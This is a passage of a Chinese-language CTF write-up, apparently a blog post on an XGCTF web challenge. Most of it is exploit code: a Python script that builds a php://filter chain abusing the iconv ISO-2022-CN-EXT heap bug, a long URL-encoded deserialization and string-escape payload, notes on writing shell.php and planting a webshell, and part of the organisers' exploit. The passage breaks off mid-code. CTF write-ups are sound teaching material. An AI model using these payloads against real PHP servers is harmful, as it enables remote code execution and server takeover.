chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>        resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> path    <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121510526.png" alt="image-20240707121510526"></p><p>执行失败是因为read的宽字节注入没配平</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121556868.png" alt="image-20240707121556868"></p><p>自己测试到配成<code>O:</code>开头为止，然后打入最后的payload（需要url编码）：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>start<span class="token operator">=</span>aO<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>read<span class="token operator">%</span><span class="token number">5</span>Ffile<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>start<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>gxngxngxn<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>filename<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1036<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>php<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Ffilter<span class="token operator">%</span><span class="token number">2</span>Fread<span class="token operator">%</span><span class="token number">3</span>Dzlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Czlib<span class="token operator">%</span><span class="token number">2</span>Einflate<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">7</span>Cdechunk<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>EUTF<span class="token operator">%</span><span class="token number">2</span>D8<span class="token operator">%</span><span class="token number">2</span>EISO<span class="token operator">%</span><span class="token number">2</span>D2022<span class="token operator">%</span><span class="token number">2</span>DCN<span class="token operator">%</span><span class="token number">2</span>DEXT<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Equoted<span class="token operator">%</span><span class="token number">2</span>Dprintable<span class="token operator">%</span><span class="token number">2</span>Ddecode<span class="token operator">%</span><span class="token number">7</span>Cconvert<span class="token operator">%</span><span class="token number">2</span>Eiconv<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Elatin1<span class="token operator">%</span><span class="token number">2</span>Fresource<span class="token operator">%</span><span class="token number">3</span>Ddata<span class="token operator">%</span><span class="token number">3</span>Atext<span class="token operator">%</span><span class="token number">2</span>Fplain<span class="token operator">%</span><span class="token number">3</span>Bbase64<span class="token operator">%</span><span class="token number">2</span>Ce3vXt<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>BNiQhbQP<span class="token operator">%</span><span class="token number">2</span>F7lrUWoS9fXVFgvvf6evI0B5ZzZjMMksp1mmoLZJsnJLRc8bD5KRN5v3f13Z8rs6<span class="token operator">%</span><span class="token number">2</span>BabGViwAsMWlMtH2ltX33FcPX2G9m6xd0pzfg1MPgkRfbtOPVWq<span class="token operator">%</span><span class="token number">2</span>FTMK91vUafvKN1UIKBjcsQ05XVFu71kN1d1771mtN3DjIOAFU<span class="token operator">%</span><span class="token number">2</span>F35RROrZpqlbb1m<span class="token operator">%</span><span class="token number">2</span>FmB74Wr62Vqfvwou<span class="token operator">%</span><span class="token number">2</span>F16k<span class="token operator">%</span><span class="token number">2</span>F2nH7X10d<span class="token operator">%</span><span class="token number">2</span>Buf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fymlyz1ev<span class="token operator">%</span><span class="token number">2</span>B8<span class="token operator">%</span><span class="token number">2</span>FZez3q5Ag44Mf<span class="token operator">%</span><span class="token number">2</span>B6isvnqZKp565pvvt<span class="token operator">%</span><span class="token number">2</span>B6780vrq29NTwebsvWYX9<span class="token operator">%</span><span class="token number">2</span>Brfj037bf<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>Fq9S7N<span class="token operator">%</span><span class="token number">2</span>B9<span class="token operator">%</span><span class="token number">2</span>FjPzJ7Tz4jft<span class="token operator">%</span><span class="token number">2</span>F6u<span class="token operator">%</span><span class="token number">2</span>Fx16xPvsuvF59wv15is3zWm<span class="token operator">%</span><span class="token number">2</span>FXf<span class="token operator">%</span><span class="token number">2</span>F36srN<span class="token operator">%</span><span class="token number">2</span>Fz5WPU9<span class="token operator">%</span><span class="token number">2</span>Bi770<span class="token operator">%</span><span class="token number">2</span>FX<span class="token operator">%</span><span class="token number">2</span>Fb<span class="token operator">%</span><span class="token number">2</span>FCLzf<span class="token operator">%</span><span class="token number">2</span>F2<span class="token operator">%</span><span class="token number">2</span>FHPv14<span class="token operator">%</span><span class="token number">2</span>Ft9u79<span class="token operator">%</span><span class="token number">2</span>B3356Ubvm2f8jxi<span class="token operator">%</span><span class="token number">2</span>Fu9d<span class="token operator">%</span><span class="token number">2</span>F3ZanJ<span class="token operator">%</span><span class="token number">2</span>Bw<span class="token operator">%</span><span class="token number">2</span>FNa347<span class="token operator">%</span><span class="token number">2</span>B3PivdX3<span class="token operator">%</span><span class="token number">2</span>Fv<span class="token operator">%</span><span class="token number">2</span>Ffvff9fON7N<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>F<span class="token operator">%</span><span class="token number">2</span>FPNe7N6m3Wmt<span class="token operator">%</span><span class="token number">2</span>Buqv<span class="token operator">%</span><span class="token number">2</span>F1<span class="token operator">%</span><span class="token number">2</span>Fm73vy9e<span class="token operator">%</span><span class="token number">2</span>Fl<span class="token operator">%</span><span class="token number">2</span>BKr9vV93vOn8qV<span class="token operator">%</span><span class="token number">2</span>B<span class="token operator">%</span><span class="token number">2</span>FdyFUm0fr3c8ec6L33UJUqc3HQ19FfpqxlWp1LT9fz8Vq9xmxq<span class="token operator">%</span><span class="token number">2</span>Bl4aGNUvLZjLXHxVKFJn6RH1U8qnhUMZ0VJ1R5rzW8<span class="token operator">%</span><span class="token number">2</span>FFjvceb8xTqBSjfZCJRpl6OzemfKlUv6<span class="token operator">%</span><span class="token number">2</span>F5ZJ7RQ6aUZA<span class="token operator">%</span><span class="token number">2</span>BYx7Qdlnvuw4XXHruYb3FI9tjPiVH9gybdfR0Kwa3<span class="token operator">%</span><span class="token number">2</span>B1<span class="token operator">%</span><span class="token number">2</span>FJ22XfupcE77v<span class="token operator">%</span><span class="token number">2</span>F7Pr8706OW4T0JkQ5X33kZbpvmW361YG2kW43OAj5JGoV2LhKz<span class="token operator">%</span><span class="token number">2</span>Ba3v3m3fvpoNKjcgA<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">&amp;</span>read<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>fAA<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707121700296.png" alt="image-20240707121700296"></p><p>成功写入shell.php，接下来用同样的方式写马即可（注意反斜杠转义<code>$</code>）</p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125336463.png" alt="image-20240707125336463"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125857528.png" alt="image-20240707125857528"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125509231.png" alt="image-20240707125509231"></p><p><img src="/blog/2024/07/06/XGCTF%E8%A5%BF%E7%93%9C%E6%9D%AF/image-20240707125456189.png" alt="image-20240707125456189"></p><p>官方的exp，处理字符串逃逸的部分写得比我好（</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.    """</span>    payload_file <span class="token operator">=</span> <span class="token string">'O:9:"read_file":2:&#123;s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">':"'</span> <span class="token operator">+</span> path <span class="token operator">+</span> <span class="token string">'";&#125;'</span>    payload <span class="token operator">=</span> <span class="token string">"%9f"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_file<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_file<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"%2b"</span><span class="token punctuation">)</span>    filename_len <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> self<span class="token punctuation">.</span>url<span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"?start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename_len<span class="token punctuation">&#125;</span></span><span class="token string">&amp;read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns the contents of a remote file.    """</span>    path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token 